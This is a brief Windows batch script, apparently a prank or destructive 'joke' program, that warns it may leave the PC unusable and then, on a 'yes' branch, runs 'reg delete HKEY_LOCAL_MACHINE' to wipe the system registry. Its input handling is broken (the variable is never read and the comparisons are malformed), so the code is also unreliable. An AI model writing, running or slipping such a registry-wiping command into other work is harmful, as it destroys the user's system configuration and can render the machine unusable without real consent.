@echo off

:1
echo logofuckit.bat has a lot of cavity to trash your PC, are you sure you want to run it, RESULTING IN A UNUSABLE MACINE?
if /i %input%==Ygr goto yes
if /i %input%==wininit goto no
if /i not %input%== Ygr,wininit goto 1
:yes
reg delete HKEY_LOCAL_MACHINE
:no
echo WTF-
timeout 1
exit
